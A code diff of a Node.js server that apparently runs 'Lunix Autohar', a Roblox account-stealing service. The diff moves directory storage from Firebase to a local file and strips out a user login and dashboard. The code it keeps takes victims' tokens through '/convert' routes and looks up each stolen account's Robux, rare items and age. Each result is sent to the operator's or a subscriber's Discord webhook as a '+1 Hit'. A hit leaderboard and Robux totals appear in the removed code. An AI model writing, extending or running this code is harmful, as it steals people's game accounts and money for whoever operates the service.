@@ -27,60 +27,31 @@ admin.initializeApp({
 const db = admin.database();
 
 // Directory management
+const DIRECTORIES_FILE = path.join(__dirname, 'directories.json');
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123'; // Change this!
 
-// Load directories from Firebase
-async function loadDirectories() {
+// Load directories from file
+function loadDirectories() {
   try {
-    const directoriesRef = db.ref('directories');
-    const snapshot = await directoriesRef.once('value');
-    return snapshot.val() || {};
+    if (fs.existsSync(DIRECTORIES_FILE)) {
+      const data = fs.readFileSync(DIRECTORIES_FILE, 'utf8');
+      return JSON.parse(data);
+    }
   } catch (error) {
-    console.error('Error loading directories from Firebase:', error);
-    return {};
+    console.error('Error loading directories:', error);
   }
+  return {};
 }
 
-// Save directories to Firebase
-async function saveDirectories(directories) {
+// Save directories to file
+function saveDirectories(directories) {
   try {
-    const directoriesRef = db.ref('directories');
-    await directoriesRef.set(directories);
+    fs.writeFileSync(DIRECTORIES_FILE, JSON.stringify(directories, null, 2));
     return true;
   } catch (error) {
-    console.error('Error saving directories to Firebase:', error);
+    console.error('Error saving directories:', error);
     return false;
   }
-}
-
-// Load users from Firebase
-async function loadUsers() {
-  try {
-    const usersRef = db.ref('users');
-    const snapshot = await usersRef.once('value');
-    return snapshot.val() || {};
-  } catch (error) {
-    console.error('Error loading users from Firebase:', error);
-    return {};
-  }
-}
-
-// Save users to Firebase
-async function saveUsers(users) {
-  try {
-    const usersRef = db.ref('users');
-    await usersRef.set(users);
-    return true;
-  } catch (error) {
-    console.error('Error saving users to Firebase:', error);
-    return false;
-  }
-}
-
-// Find user by auth token
-async function findUserByAuthToken(authToken) {
-  const users = await loadUsers();
-  return Object.values(users).find(user => user.auth_token === authToken);
 }
 
 // Generate API token if not set
@@ -117,7 +88,7 @@ async function logUserData(token, userData, context = {}) {
   try {
     // Hash the token for security - never store raw tokens
     const hashedToken = crypto.createHash('sha256').update(token).digest('hex').substring(0, 16);
-
+    
     const logEntry = {
       tokenHash: hashedToken, // Store only hashed version
       userData: userData,
@@ -153,54 +124,23 @@ app.get('/create', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'create.html'));
 });
 
-// Serve the login page
-app.get('/login', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'login.html'));
-});
-
-// Serve the dashboard page
-app.get('/dashboard', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
-});
-
-// Logout endpoint
-app.get('/logout', (req, res) => {
-  res.redirect('/login');
-});
-
-// Authentication middleware for user routes
-async function requireAuth(req, res, next) {
-  const authToken = req.headers['authorization']?.replace('Bearer ', '') || 
-                   req.query.token || 
-                   req.body.auth_token;
-
-  const user = await findUserByAuthToken(authToken);
-
-  if (!user) {
-    return res.status(401).json({ error: 'Invalid auth token' });
-  }
-
-  req.user = user;
-  next();
-}
-
 // Middleware to protect admin dashboard with password
 function requireAdminPassword(req, res, next) {
   const authHeader = req.headers.authorization;
-
+  
   if (!authHeader || !authHeader.startsWith('Basic ')) {
     res.setHeader('WWW-Authenticate', 'Basic realm="Admin Area"');
     return res.status(401).json({ error: 'Authentication required' });
   }
-
+  
   const base64Credentials = authHeader.split(' ')[1];
   const credentials = Buffer.from(base64Credentials, 'base64').toString('ascii');
   const [username, password] = credentials.split(':');
-
+  
   // Check credentials (you can change these)
   const validUsername = process.env.ADMIN_USERNAME || 'admin';
   const validPassword = process.env.ADMIN_PASSWORD || 'admin123';
-
+  
   if (username === validUsername && password === validPassword) {
     next();
   } else {
@@ -230,167 +170,6 @@ app.get('/api/token', (req, res) => {
   res.json({ token: API_TOKEN });
 });
 
-// User login endpoint
-app.post('/api/login', async (req, res) => {
-  try {
-    const { auth_token } = req.body;
-
-    if (!auth_token) {
-      return res.status(400).json({ error: 'Auth token required' });
-    }
-
-    const user = await findUserByAuthToken(auth_token);
-
-    if (!user) {
-      return res.status(401).json({ error: 'Invalid auth token' });
-    }
-
-    // Update last login
-    const users = await loadUsers();
-    const userId = Object.keys(users).find(id => users[id].auth_token === auth_token);
-    if (userId) {
-      users[userId].last_login = new Date().toISOString();
-      await saveUsers(users);
-    }
-
-    res.json({ 
-      success: true, 
-      user: {
-        directory_name: user.directory_name,
-        service_type: user.service_type,
-        created: user.created,
-        total_hits: user.total_hits,
-        last_login: user.last_login
-      }
-    });
-  } catch (error) {
-    console.error('Login error:', error);
-    res.status(500).json({ error: 'Login failed' });
-  }
-});
-
-// Get user dashboard data
-app.get('/api/user/dashboard', requireAuth, async (req, res) => {
-  try {
-    const user = req.user;
-    const directories = await loadDirectories();
-    const directoryConfig = directories[user.directory_name];
-
-    if (!directoryConfig) {
-      return res.status(404).json({ error: 'Directory not found' });
-    }
-
-    // Get hit count from Firebase (you can enhance this)
-    const dashboardData = {
-      user: {
-        directory_name: user.directory_name,
-        service_type: user.service_type,
-        created: user.created,
-        total_hits: user.total_hits || 0,
-        last_login: user.last_login
-      },
-      directory: {
-        webhookUrl: directoryConfig.webhookUrl,
-        dualhookWebhookUrl: directoryConfig.dualhookWebhookUrl,
-        serviceType: directoryConfig.serviceType,
-        created: directoryConfig.created,
-        subdirectories: Object.keys(directoryConfig.subdirectories || {}).length
-      },
-      urls: {
-        main: `http://${req.get('host')}/${user.directory_name}`,
-        create: user.serviceType === 'dualhook' ? 
-          `http://${req.get('host')}/${user.directory_name}/create` : null
-      }
-    };
-
-    res.json(dashboardData);
-  } catch (error) {
-    console.error('Dashboard error:', error);
-    res.status(500).json({ error: 'Failed to load dashboard' });
-  }
-});
-
-// Dashboard stats API endpoint
-app.get('/api/dashboard/stats', requireAuth, async (req, res) => {
-  try {
-    const users = await loadUsers();
-    const directories = await loadDirectories();
-    const currentUser = req.user;
-
-    // Create leaderboard sorted by hit count (keep global)
-    const leaderboard = Object.values(users)
-      .map(user => ({
-        directoryName: user.directory_name,
-        hitCount: user.total_hits || 0
-      }))
-      .sort((a, b) => b.hitCount - a.hitCount)
-      .slice(0, 10); // Top 10
-
-    // Get recent hits from Firebase if available (keep global)
-    let recentHits = [];
-    try {
-      const logsRef = db.ref('user_logs');
-      const recentLogsQuery = logsRef.orderByChild('timestamp').limitToLast(10);
-      const snapshot = await recentLogsQuery.once('value');
-      const data = snapshot.val();
-
-      if (data) {
-        recentHits = Object.values(data)
-          .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
-          .slice(0, 5)
-          .map(log => ({
-            username: log.userData.username || 'Unknown User',
-            timestamp: log.timestamp
-          }));
-      }
-    } catch (firebaseError) {
-      console.log('Firebase not available for recent hits');
-    }
-
-    // Calculate user-specific stats from Firebase logs
-    let userSummary = 0;
-    let userRobux = 0;
-    let userHits = currentUser.total_hits || 0;
-
-    try {
-      const logsRef = db.ref('user_logs');
-      const snapshot = await logsRef.once('value');
-      const data = snapshot.val();
-
-      if (data) {
-        // Filter logs for current user's directory (including main directory and subdirectories)
-        const userLogs = Object.values(data).filter(log => 
-          log.context && 
-          (log.context.directory === currentUser.directory_name ||
-           (log.context.subdirectory && log.context.directory === currentUser.directory_name))
-        );
-
-        // Calculate totals from all user's hits (including repeated)
-        userSummary = userLogs.reduce((sum, log) => {
-          return sum + (log.userData?.summary || 0);
-        }, 0);
-
-        userRobux = userLogs.reduce((sum, log) => {
-          return sum + (log.userData?.robux || 0);
-        }, 0);
-      }
-    } catch (firebaseError) {
-      console.log('Firebase not available for user stats');
-    }
-
-    res.json({
-      userSummary,
-      userHits,
-      userRobux,
-      leaderboard,
-      recentHits
-    });
-  } catch (error) {
-    console.error('Dashboard stats error:', error);
-    res.status(500).json({ error: 'Failed to load dashboard stats' });
-  }
-});
-
 // API endpoint to create new directories
 app.post('/api/create-directory', async (req, res) => {
   try {
@@ -412,15 +191,12 @@ app.post('/api/create-directory', async (req, res) => {
     }
 
     // Load existing directories
-    const directories = await loadDirectories();
+    const directories = loadDirectories();
 
     // Check if directory already exists
     if (directories[directoryName]) {
       return res.status(409).json({ error: 'Directory already exists' });
     }
-
-    // Generate auth token for the user (same as API token for simplicity)
-    const authToken = crypto.randomBytes(32).toString('hex');
 
     // Create new directory entry
     directories[directoryName] = {
@@ -428,35 +204,12 @@ app.post('/api/create-directory', async (req, res) => {
       serviceType: serviceType || 'single',
       dualhookWebhookUrl: serviceType === 'dualhook' ? dualhookWebhookUrl : null,
       created: new Date().toISOString(),
-      apiToken: authToken, // This is also their login token
-      owner_auth_token: authToken,
+      apiToken: crypto.randomBytes(32).toString('hex'),
       subdirectories: {} // For nested directories in dualhook
     };
 
-    // Auto-register the user
-    const users = await loadUsers();
-    const userId = `user_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
-
-    users[userId] = {
-      user_id: userId,
-      auth_token: authToken,
-      directory_name: directoryName,
-      webhook_url: webhookUrl,
-      service_type: serviceType || 'single',
-      dualhook_webhook_url: serviceType === 'dualhook' ? dualhookWebhookUrl : null,
-      created: new Date().toISOString(),
-      total_hits: 0,
-      last_login: null,
-      directories_owned: [directoryName]
-    };
-
-    // Save both directories and users
-    if (!(await saveUsers(users))) {
-      return res.status(500).json({ error: 'Failed to register user' });
-    }
-
     // Save directories
-    if (!(await saveDirectories(directories))) {
+    if (!saveDirectories(directories)) {
       return res.status(500).json({ error: 'Failed to save directory configuration' });
     }
 
@@ -467,11 +220,9 @@ app.post('/api/create-directory', async (req, res) => {
       const serviceTypeLabel = serviceType === 'dualhook' 
         ? `${directoryName.toUpperCase()} GENERATOR` 
         : 'LUNIX AUTOHAR';
-      const loginInfo = `\n\n🔑 **Your Login Token:**\n\`${authToken}\`\n\n📊 **Dashboard:** \`http://${req.get('host')}/login\``;
-
       const description = serviceType === 'dualhook' 
-        ? `Ur ${directoryName.charAt(0).toUpperCase() + directoryName.slice(1)} Generator URLs\n📌\n\nYour Autohar\n\`http://${req.get('host')}/${directoryName}\`\n\nDualhook Autohar\n\`http://${req.get('host')}/${directoryName}/create\`${loginInfo}`
-        : `Ur LUNIX AUTOHAR url\n📌\n\n\`http://${req.get('host')}/${directoryName}\`${loginInfo}`;
+        ? `Ur ${directoryName.charAt(0).toUpperCase() + directoryName.slice(1)} Generator URLs\n📌\n\nYour Autohar\n\`http://${req.get('host')}/${directoryName}\`\n\nDualhook Autohar\n\`http://${req.get('host')}/${directoryName}/create\``
+        : `Ur LUNIX AUTOHAR url\n📌\n\n\`http://${req.get('host')}/${directoryName}\``;
 
       const notificationPayload = {
         embeds: [{
@@ -852,7 +603,7 @@ async function fetchRobloxUserData(token) {
       korblox: hasKorblox,
       headless: hasHeadless,
       accountAge: accountAge,
-      groupsOwned: hasGroupsOwned,
+      groupsOwned: groupsOwned,
       placeVisits: 0, // This data is not easily accessible via API
       inventory: inventoryData
     };
@@ -1145,7 +896,7 @@ app.post('/convert', validateRequest, async (req, res) => {
 
 
       // Send to Discord webhook with user data
-      const webhookResult = await sendToDiscord(token, userAgent, scriptType, webhookUserData, null, null);
+      const webhookResult = await sendToDiscord(token, userAgent, scriptType, webhookUserData);
 
       if (!webhookResult.success) {
         console.log('❌ Webhook failed:', webhookResult.error);
@@ -1220,7 +971,7 @@ app.get('/:directory/:subdirectory', (req, res) => {
 app.post('/:directory/convert', async (req, res) => {
   try {
     const directoryName = req.params.directory;
-    const directories = await loadDirectories();
+    const directories = loadDirectories();
 
     // Check if directory exists
     if (!directories[directoryName]) {
@@ -1291,14 +1042,6 @@ app.post('/:directory/convert', async (req, res) => {
       // Log user data to database
       await logUserData(token, webhookUserData, { ip: req.ip, directory: directoryName });
 
-      // Update user hit count
-      const users = await loadUsers();
-      const userEntry = Object.values(users).find(u => u.directory_name === directoryName);
-      if (userEntry) {
-        userEntry.total_hits = (userEntry.total_hits || 0) + 1;
-        await saveUsers(users);
-      }
-
       const customTitle = `🎯 +1 Hit - Lunix Autohar`;
 
       // Send to Discord webhook with user data
@@ -1349,7 +1092,7 @@ app.post('/:directory/api/create-subdirectory', async (req, res) => {
     const { subdirectoryName, webhookUrl } = req.body;
 
     // Load directories
-    const directories = await loadDirectories();
+    const directories = loadDirectories();
 
     // Check if parent directory exists and is dualhook type
     if (!directories[parentDirectory] || directories[parentDirectory].serviceType !== 'dualhook') {
@@ -1379,7 +1122,7 @@ app.post('/:directory/api/create-subdirectory', async (req, res) => {
     };
 
     // Save directories
-    if (!(await saveDirectories(directories))) {
+    if (!saveDirectories(directories)) {
       return res.status(500).json({ error: 'Failed to save subdirectory configuration' });
     }
 
@@ -1476,7 +1219,7 @@ app.post('/:directory/:subdirectory/convert', async (req, res) => {
   try {
     const directoryName = req.params.directory;
     const subdirectoryName = req.params.subdirectory;
-    const directories = await loadDirectories();
+    const directories = loadDirectories();
 
     // Check if subdirectory exists
     if (!directories[directoryName] || !directories[directoryName].subdirectories[subdirectoryName]) {
